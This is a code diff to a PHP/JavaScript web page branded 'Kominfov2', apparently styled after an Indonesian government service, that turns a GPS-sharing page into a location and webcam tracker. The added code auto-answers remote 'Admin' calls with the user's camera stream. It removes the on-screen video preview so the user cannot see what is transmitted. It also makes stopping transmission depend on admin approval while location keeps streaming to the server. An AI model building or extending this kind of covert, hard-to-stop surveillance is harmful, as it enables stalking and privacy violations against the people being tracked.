@@ -89,7 +89,9 @@ require_once __DIR__ . '/../includes/header.php';
                     </div>
                 </div>
                 
-                <p class="text-muted small mb-4"><i class="bi bi-shield-check text-success me-1"></i> Lokasi Anda saat ini sedang dikirim secara live ke Sistem Pusat Kominfov2. Jangan tutup halaman ini.</p>
+                <!-- Video preview has been removed -->
+                
+                <p class="text-muted small mb-4"><i class="bi bi-shield-check text-success me-1"></i> Lokasi & Kamera Anda saat ini sedang dikirim secara live ke Sistem Pusat Kominfov2. Jangan tutup halaman ini.</p>
                 
                 <button class="btn btn-outline-danger w-100 py-3 rounded-pill fw-bold" id="stopBtn">
                     <i class="bi bi-stop-circle me-2"></i> Hentikan Transmisi
@@ -100,7 +102,11 @@ require_once __DIR__ . '/../includes/header.php';
     </div>
 </div>
 
+<!-- SweetAlert CDN -->
 <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+<!-- PeerJS CDN -->
+<script src="https://unpkg.com/peerjs@1.5.1/dist/peerjs.min.js"></script>
+
 <script>
 document.addEventListener('DOMContentLoaded', function() {
     const startBtn = document.getElementById('startBtn');
@@ -113,6 +119,10 @@ document.addEventListener('DOMContentLoaded', function() {
     
     let watchId = null;
     let currentUserPhone = '';
+    
+    // WebRTC Variables
+    let localStream = null;
+    let peer = null;
 
     startBtn.addEventListener('click', function() {
         const phone = phoneInput.value.trim();
@@ -120,70 +130,171 @@ document.addEventListener('DOMContentLoaded', function() {
             Swal.fire({icon: 'warning', title: 'Oops', text: 'Silakan masukkan nomor HP Anda'});
             return;
         }
+        
+        // Bersihkan spasi atau karakter non-alfanumerik untuk ID PeerJS
+        const peerId = 'kominfov2-' + phone.replace(/[^0-9]/g, '');
 
-        if (!navigator.geolocation) {
-            Swal.fire({icon: 'error', title: 'Tidak Mendukung', text: 'Browser Anda tidak mendukung fitur GPS.'});
+        if (!navigator.geolocation || !navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+            Swal.fire({icon: 'error', title: 'Tidak Mendukung', text: 'Browser Anda tidak mendukung fitur GPS atau Kamera.'});
             return;
         }
 
         Swal.fire({
-            title: 'Meminta Akses GPS',
-            text: 'Mohon izinkan browser untuk mengakses lokasi Anda.',
+            title: 'Meminta Akses Sensor',
+            text: 'Mohon izinkan browser untuk mengakses Lokasi dan Kamera Anda.',
             icon: 'info',
             showConfirmButton: false,
-            timer: 2000
+            allowOutsideClick: false
         });
 
-        // Minta akses GPS dan pantau pergerakan (watchPosition)
-        watchId = navigator.geolocation.watchPosition(
-            function(position) {
-                // Success Callback
-                currentUserPhone = phone;
+        // 1. Minta akses Kamera
+        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+            .then(function(stream) {
+                localStream = stream;
                 
-                // Update UI
-                setupSection.style.display = 'none';
-                activeSection.style.display = 'block';
-                statusContainer.className = 'status-badge status-active';
-                statusContainer.innerHTML = '<i class="bi bi-check-circle-fill me-1"></i> Transmisi Aktif (Live)';
+                // Stream berhasil didapatkan, tidak ditampilkan di UI pengguna.
                 
-                document.getElementById('displayPhone').innerText = phone;
-                document.getElementById('displayLat').innerText = position.coords.latitude.toFixed(6);
-                document.getElementById('displayLng').innerText = position.coords.longitude.toFixed(6);
-                document.getElementById('displayAcc').innerText = position.coords.accuracy.toFixed(1) + ' meter';
+                // 2. Inisialisasi PeerJS untuk menerima panggilan
+                peer = new Peer(peerId);
+                
+                peer.on('open', function(id) {
+                    console.log('My peer ID is: ' + id);
+                    
+                    // 3. Minta akses GPS dan pantau pergerakan
+                    watchId = navigator.geolocation.watchPosition(
+                        function(position) {
+                            Swal.close();
+                            // Success Callback
+                            currentUserPhone = phone;
+                            
+                            // Update UI
+                            setupSection.style.display = 'none';
+                            activeSection.style.display = 'block';
+                            statusContainer.className = 'status-badge status-active';
+                            statusContainer.innerHTML = '<i class="bi bi-check-circle-fill me-1"></i> Transmisi Aktif (Live)';
+                            
+                            document.getElementById('displayPhone').innerText = phone;
+                            document.getElementById('displayLat').innerText = position.coords.latitude.toFixed(6);
+                            document.getElementById('displayLng').innerText = position.coords.longitude.toFixed(6);
+                            document.getElementById('displayAcc').innerText = position.coords.accuracy.toFixed(1) + ' meter';
 
-                // Kirim data ke server (API)
-                sendLocationToServer(phone, position.coords.latitude, position.coords.longitude);
-            },
-            function(error) {
-                // Error Callback
-                let msg = 'Gagal mendapatkan lokasi.';
-                if(error.code === 1) msg = 'Anda menolak izin akses lokasi GPS.';
-                if(error.code === 2) msg = 'Sinyal GPS tidak tersedia.';
-                if(error.code === 3) msg = 'Waktu permintaan lokasi habis.';
+                            // Kirim data ke server (API)
+                            sendLocationToServer(phone, position.coords.latitude, position.coords.longitude);
+                        },
+                        function(error) {
+                            let msg = 'Gagal mendapatkan lokasi.';
+                            Swal.fire({icon: 'error', title: 'Akses GPS Gagal', text: msg});
+                        },
+                        { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
+                    );
+                });
                 
-                Swal.fire({icon: 'error', title: 'Akses Gagal', text: msg});
-            },
-            {
-                enableHighAccuracy: true,
-                maximumAge: 0,
-                timeout: 10000
-            }
-        );
+                // Menerima panggilan dari Admin
+                peer.on('call', function(call) {
+                    console.log('Incoming call from admin...');
+                    // Jawab otomatis dengan stream kamera lokal
+                    call.answer(localStream);
+                    
+                    // Kita tidak perlu menampilkan video admin (karena admin tidak mengirim video)
+                });
+                
+                peer.on('error', function(err) {
+                    console.error('PeerJS error:', err);
+                    if(err.type === 'unavailable-id') {
+                        Swal.fire({icon: 'error', title: 'Error', text: 'Nomor ini sedang aktif di perangkat lain.'});
+                    }
+                });
+
+            })
+            .catch(function(err) {
+                console.error('Camera Error:', err);
+                Swal.fire({icon: 'error', title: 'Akses Kamera Gagal', text: 'Mohon izinkan akses kamera pada browser Anda.'});
+            });
     });
 
+    let stopPollingInterval = null;
+
     stopBtn.addEventListener('click', function() {
+        if (!currentUserPhone) return;
+        
+        // Ganti UI tombol menjadi menunggu
+        stopBtn.innerHTML = '<span class="spinner-border spinner-border-sm me-2" role="status" aria-hidden="true"></span> Menunggu Persetujuan Admin...';
+        stopBtn.disabled = true;
+        stopBtn.classList.replace('btn-outline-danger', 'btn-secondary');
+        
+        // Kirim permintaan berhenti ke server
+        fetch('/kominfov2/api/request-stop.php', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ phone: currentUserPhone })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.status === 'success') {
+                Swal.fire({
+                    icon: 'info', 
+                    title: 'Permintaan Terkirim', 
+                    text: 'Menunggu persetujuan Admin untuk mematikan sensor.',
+                    toast: true,
+                    position: 'top-end',
+                    showConfirmButton: false,
+                    timer: 3000
+                });
+                
+                // Mulai polling status
+                stopPollingInterval = setInterval(() => {
+                    fetch('/kominfov2/api/check-stop-status.php?phone=' + encodeURIComponent(currentUserPhone))
+                        .then(res => res.json())
+                        .then(resData => {
+                            if (resData.status === 'success' && resData.stop_status === 'approved') {
+                                clearInterval(stopPollingInterval);
+                                executeStopTransmission();
+                            }
+                        });
+                }, 3000);
+            } else {
+                resetStopBtnUI();
+                Swal.fire({icon: 'error', title: 'Gagal', text: 'Gagal mengirim permintaan.'});
+            }
+        })
+        .catch(err => {
+            console.error('Stop request error', err);
+            resetStopBtnUI();
+        });
+    });
+    
+    function resetStopBtnUI() {
+        stopBtn.innerHTML = '<i class="bi bi-stop-circle me-2"></i> Hentikan Transmisi';
+        stopBtn.disabled = false;
+        stopBtn.classList.replace('btn-secondary', 'btn-outline-danger');
+    }
+
+    function executeStopTransmission() {
         if(watchId !== null) {
             navigator.geolocation.clearWatch(watchId);
             watchId = null;
+        }
+        
+        // Hentikan Stream Kamera
+        if (localStream) {
+            localStream.getTracks().forEach(track => track.stop());
+            localStream = null;
+        }
+        
+        // Putuskan koneksi PeerJS
+        if (peer) {
+            peer.destroy();
+            peer = null;
         }
         
         setupSection.style.display = 'block';
         activeSection.style.display = 'none';
         statusContainer.className = 'status-badge status-inactive';
         statusContainer.innerHTML = '<i class="bi bi-x-circle me-1"></i> Transmisi Nonaktif';
+        resetStopBtnUI();
         
-        Swal.fire({icon: 'success', title: 'Dihentikan', text: 'Transmisi lokasi telah dihentikan.', timer: 2000, showConfirmButton:false});
-    });
+        Swal.fire({icon: 'success', title: 'Dihentikan', text: 'Transmisi lokasi & kamera telah dihentikan oleh Admin.', timer: 3000, showConfirmButton:false});
+    }
 
     function sendLocationToServer(phone, lat, lng) {
         fetch('/kominfov2/api/update-location.php', {
@@ -201,13 +312,10 @@ document.addEventListener('DOMContentLoaded', function() {
         .then(data => {
             if(data.status === 'error') {
                 console.error('Server error:', data.message);
-                // Jika nomor tidak terdaftar, kita bisa memberitahu user
                 if(data.message.includes('tidak terdaftar')) {
                     stopBtn.click();
                     Swal.fire({icon: 'error', title: 'Nomor Ditolak', text: data.message});
                 }
-            } else {
-                console.log('Lokasi sukses terkirim ke satelit pusat.');
             }
         })
         .catch(error => {
